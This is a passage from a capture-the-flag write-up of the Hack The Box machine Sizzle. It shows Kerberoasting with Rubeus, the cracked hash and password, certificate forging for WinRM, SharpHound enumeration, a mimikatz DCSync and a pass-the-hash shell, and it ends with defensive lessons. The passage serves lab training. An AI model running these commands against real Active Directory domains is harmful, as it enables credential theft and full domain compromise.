      SDEjWk/9zZq+3Lz6ShKUtLBhWUvPwdknzRjkAk4Ajwv1CWitXLOcDO4B8OjPm/8DOKvwWaD7XW4+9Kf/
      APmkvCDotBB1jKZuoBvgbSCzRnO7cPbx+pGyvpqhIeVac6/f91tTVMccblQvLqaQ1sKjgcswgcigAwIB
      AKKBwASBvX2BujCBt6CBtDCBsTCBrqAbMBmgAwIBF6ESBBCp0X4zsPstFRVskdHTJWoMoQsbCUhUQi5M
      T0NBTKITMBGgAwIBAaEKMAgbBmFtYW5kYaMHAwUAQOEAAKURGA8yMDI2MDYxODAwMDMzOVqmERgPMjAy
      NjA2MTgxMDAzMzlapxEYDzIwMjYwNjI1MDAwMzM5WqgLGwlIVEIuTE9DQUypHjAcoAMCAQKhFTATGwZr
      cmJ0Z3QbCWh0Yi5sb2NhbA==

[*] Ticket written to amanda.kirbi


  ServiceName              :  krbtgt/htb.local
  ServiceRealm             :  HTB.LOCAL
  UserName                 :  amanda
  UserRealm                :  HTB.LOCAL
  StartTime                :  6/17/2026 8:03:39 PM
  EndTime                  :  6/18/2026 6:03:39 AM
  RenewTill                :  6/24/2026 8:03:39 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  qdF+M7D7LRUVbJHR0yVqDA==
  ASREP (key)              :  7D0516EA4B6ED084F3FDF71C47D9BEB3

*Evil-WinRM* PS C:\Windows\Temp> .\Rubeus.exe kerberoast /domain:htb.local /dc:10.129.23.236 /ticket:amanda.kirbi /nowrap /outfile:hashes.txt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


[*] Action: Kerberoasting

[*] Using a TGT /ticket to request service tickets
[*] Target Domain          : htb.local
[+] Ticket successfully imported!
[*] Searching path 'LDAP://sizzle.HTB.LOCAL/DC=htb,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : mrlky
[*] DistinguishedName      : CN=mrlky,CN=Users,DC=HTB,DC=LOCAL
[*] ServicePrincipalName   : http/sizzle
[*] PwdLastSet             : 7/10/2018 2:08:09 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Windows\Temp\hashes.txt

[*] Roasted hashes written to : C:\Windows\Temp\hashes.txt
*Evil-WinRM* PS C:\Windows\Temp> cat hashes.txt
$krb5tgs$23$*mrlky$htb.local$http/sizzle*$DFA01D4481647E449CDDC7A4B00B1254$BCCBCCEC749226F857A544C5897229D822068A56336CFA7099BD16C310E9660CD8A0F34735D87478CF0B60E42C6AFEE2DE177CC6AD00A52BBF3CF0DCA1DC7ED9BE9213338BA1E4147F2EFDAC1D33971B21378BF95F688604BEBA2E1D0C52DFCE5E4A837A63EF0C1A719136407144A09C5A787750AA33BDE04A24C50D092F617A474D9F0CAF18DEB3F331805415BE488E21D71AF81D9CBA565455C685BEE462C2287EAA1A54451D85BF103CB5BEE254BF60C3BB7759E566AFD1481A3DEB5453DEC16929C4D5BFBF50730B53F1AA146165F4E29FE0871C9AA13B6D94058B93AA05ACD0313F158059A67636FDD763D841E540628FFA0EF558E8C535830533BCEC744C3AD7B54B700A313220808C2F52B921E91234C9FDBA806EEE73F48D0633DE37A222D0A2B28F0179463CBAE5AF0AC7D8476BAE60BEB3C1A1750421BF863F984172375077F3DB2EDC941535C07B01252EC265A2130B2E191CE12757C8D1676A424B4B3EA8EE2CC38E3C0EB7614E06E6956443AAFD56171E7FD08875C3F5DDA3590491E96FDCD66094B49CEBF204F2592771729C183CB6F8DECC4375407ACCF32947F689B713287B261BB32F0D16F770498D907E21ED40C8C7AE8CC76043FD513F966B9A1EBDFF5635EA4215DBFCEC11F0485E1E47553C70CB406877AB509433B33660CC3931F32DAEC6F231B6B0AE4E725422566C8792E3C06572156119E6E62E64B8E6DBF5F8ED2F9F61D237C0759D194AB27C540A72BBE3221B144B8FA348D9CE9AE9FDB40429C5C1D1442973D9A68F22562CDBA72E1A5AD052142D18EA3B859E19297DEFBF700560E2E0C5EC81BFBE445B2C86158556232D319CDC68FD79F122F3C821A6162A8D7A24123C1290046358F741FEA227C8411DCA128DA36573DD7D57D86AAFDD88A55FB0D64053911267CC9C4E62BC6B437FFD1212F963D5645E38C83E96AECE9A069E9CC52E79443BDD3C9337FA27FDA7B7957453736CA9E376C0F32592EBD7BC0961FC5719F00E70D2505E2980308410A58CD6764226B522E0BB67AE3C8287CA5AEB2D7FF70B6CF35DB4633739D4DA2B4CB5F3756D7F5769235AA378646A361B4B04945F858831D72526780FB402F806633EF29E09EC7FEB5EE86378D2715AD820090E1D2AC8FE0837E62B4C86815384A42EAF552661C79CACF786D5FC5114FEF24F4C080D330F8C92A675B169816C84D80071E95CC1501EA9942DA81313F3B0ED14BD33379B13907CF7C5E0E1DD98529B
```

Now let's crack:

```bash
$ echo '$krb5tgs$23$*mrlky$htb.local$http/sizzle*$DFA01D4481647E449CDDC7A4B00B1254$BCCBCCEC749226F857A544C5897229D822068A56336CFA7099BD16C310E9660CD8A0F34735D87478CF0B60E42C6AFEE2DE177CC6AD00A52BBF3CF0DCA1DC7ED9BE9213338BA1E4147F2EFDAC1D33971B21378BF95F688604BEBA2E1D0C52DFCE5E4A837A63EF0C1A719136407144A09C5A787750AA33BDE04A24C50D092F617A474D9F0CAF18DEB3F331805415BE488E21D71AF81D9CBA565455C685BEE462C2287EAA1A54451D85BF103CB5BEE254BF60C3BB7759E566AFD1481A3DEB5453DEC16929C4D5BFBF50730B53F1AA146165F4E29FE0871C9AA13B6D94058B93AA05ACD0313F158059A67636FDD763D841E540628FFA0EF558E8C535830533BCEC744C3AD7B54B700A313220808C2F52B921E91234C9FDBA806EEE73F48D0633DE37A222D0A2B28F0179463CBAE5AF0AC7D8476BAE60BEB3C1A1750421BF863F984172375077F3DB2EDC941535C07B01252EC265A2130B2E191CE12757C8D1676A424B4B3EA8EE2CC38E3C0EB7614E06E6956443AAFD56171E7FD08875C3F5DDA3590491E96FDCD66094B49CEBF204F2592771729C183CB6F8DECC4375407ACCF32947F689B713287B261BB32F0D16F770498D907E21ED40C8C7AE8CC76043FD513F966B9A1EBDFF5635EA4215DBFCEC11F0485E1E47553C70CB406877AB509433B33660CC3931F32DAEC6F231B6B0AE4E725422566C8792E3C06572156119E6E62E64B8E6DBF5F8ED2F9F61D237C0759D194AB27C540A72BBE3221B144B8FA348D9CE9AE9FDB40429C5C1D1442973D9A68F22562CDBA72E1A5AD052142D18EA3B859E19297DEFBF700560E2E0C5EC81BFBE445B2C86158556232D319CDC68FD79F122F3C821A6162A8D7A24123C1290046358F741FEA227C8411DCA128DA36573DD7D57D86AAFDD88A55FB0D64053911267CC9C4E62BC6B437FFD1212F963D5645E38C83E96AECE9A069E9CC52E79443BDD3C9337FA27FDA7B7957453736CA9E376C0F32592EBD7BC0961FC5719F00E70D2505E2980308410A58CD6764226B522E0BB67AE3C8287CA5AEB2D7FF70B6CF35DB4633739D4DA2B4CB5F3756D7F5769235AA378646A361B4B04945F858831D72526780FB402F806633EF29E09EC7FEB5EE86378D2715AD820090E1D2AC8FE0837E62B4C86815384A42EAF552661C79CACF786D5FC5114FEF24F4C080D330F8C92A675B169816C84D80071E95CC1501EA9942DA81313F3B0ED14BD33379B13907CF7C5E0E1DD98529B' > mrlky

$ john --wordlist=/usr/share/wordlists/rockyou.txt mrlky
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Football#7       (?)
1g 0:00:00:04 DONE (2026-06-18 02:05) 0.2320g/s 2591Kp/s 2591Kc/s 2591KC/s Francisfer..Flubb3r
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Here we go, `mrlky` : `Football#7`.

Now repeat the same process as before with `amanda` to get a valid certificate in order to log in:

```bash
$ openssl genrsa -des3 -out mrlky.key 2048 && \
  openssl req -new -key mrlky.key -out mrlky.csr && \
  openssl rsa -in mrlky.key -out mrlky.key
Enter PEM pass phrase:<Football#7>
Verifying - Enter PEM pass phrase:<Football#7>
Enter pass phrase for mrlky.key:<Football#7>
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:
Enter pass phrase for mrlky.key:<Football#7>
writing RSA key
```
> In order to get a valid csr as mrlky and not amanda, make sure to issue a csr in an incognito tab. Otherwise, being logged in as amanda, the certs you will get will always be issued for amanda!

```bash
$ evil-winrm -i $IP --priv-key ./mrlky.key --pub-key ./certnew_mrlky.cer --ssl

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\mrlky.HTB\Documents> whoami
htb\mrlky
```

Let's run `SharpHound.exe`:

Running latest version got us this error:

```powershell
2026-06-17T20:35:10.9383141-04:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound

2026-06-17T20:35:10.9539396-04:00|INFORMATION|SharpHound Version: 2.12.0.0

2026-06-17T20:35:10.9539396-04:00|INFORMATION|SharpHound Common Version: 4.6.1.0

2026-06-17T20:35:10.9539396-04:00|ERROR|The .Net Runtime is not compatible with SharpHound. Please update to .Net 4.7.2. 
```

For that, let's run `SharpHound` Version `1.1.1`:

```powershell
*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> .\PowerLess.exe '.\SharpHound.exe -c All --zipfilename loot.zip'
2026-06-17T20:38:38.1575227-04:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2026-06-17T20:38:38.2825217-04:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2026-06-17T20:38:38.2981455-04:00|INFORMATION|Initializing SharpHound at 8:38 PM on 6/17/2026
2026-06-17T20:38:38.4387779-04:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for HTB.LOCAL : sizzle.HTB.LOCAL
2026-06-17T20:38:38.4543954-04:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2026-06-17T20:38:38.5793952-04:00|INFORMATION|Beginning LDAP search for HTB.LOCAL
2026-06-17T20:38:38.6418962-04:00|INFORMATION|Producer has finished, closing LDAP channel
2026-06-17T20:38:38.6418962-04:00|INFORMATION|LDAP channel closed, waiting for consumers
2026-06-17T20:39:08.8763487-04:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 35 MB RAM
2026-06-17T20:39:24.6732476-04:00|INFORMATION|Consumers finished, closing output channel
2026-06-17T20:39:24.7044981-04:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2026-06-17T20:39:24.8763726-04:00|INFORMATION|Status: 94 objects finished (+94 2.043478)/s -- Using 42 MB RAM
2026-06-17T20:39:24.8763726-04:00|INFORMATION|Enumeration finished in 00:00:46.3154306
2026-06-17T20:39:24.9544990-04:00|INFORMATION|Saving cache with stats: 54 ID to type mappings.
 53 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2026-06-17T20:39:24.9701228-04:00|INFORMATION|SharpHound Enumeration Completed at 8:39 PM on 6/17/2026! Happy Graphing!
```

We see that `mrlky` can `DCSync` the DC:

![sizzle-5.htb](/assets/img/ctf/data/sizzle-5.png)

---

## 📈 4. Privilege Escalation (`mrlky` -> `Administrator`)

In order to perform the `DCSync` attack, we need to upload an obfuscated version of `mimikatz.exe` to execute the following:

```powershell
mimikatz.exe lsadump::dcsync /user:administrator /domain:htb.local /dc:sizzle
```

Which will provide us Administrator's RC4 hash: `f6b7160bfc91823792e0ac3a162c9267`.

```bash
$ impacket-wmiexec administrator@sizzle.htb -hashes :f6b7160bfc91823792e0ac3a162c9267
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
htb\administrator
```

---

## 🧠 Learnings

* **Lock Down Share Permissions:** Writable public or archive SMB shares are an immediate liability. Attackers can upload `.scf` or `.url` files to blindly harvest NTLMv2 hashes from any user or automated script browsing the folder.
* **Inspect 401 WinRM Failures:** If valid credentials fail to authenticate over WinRM, check for active certificate-based authentication requirements. Look for exposed ADCS web templates to issue valid session certs.
* **Watch Out for Browser Session Poisoning:** When using `/certsrv` to issue certificates for a newly compromised user, always use an incognito window. Otherwise, the browser may reuse authentication cookies from your previous user session.
* **Audit Domain Replication Rights:** Regularly review BloodHound for accounts holding `GetChanges` or `GetChangesAll` rights. Any account with these privileges can mimic a Domain Controller and steal the entire active directory credential database.
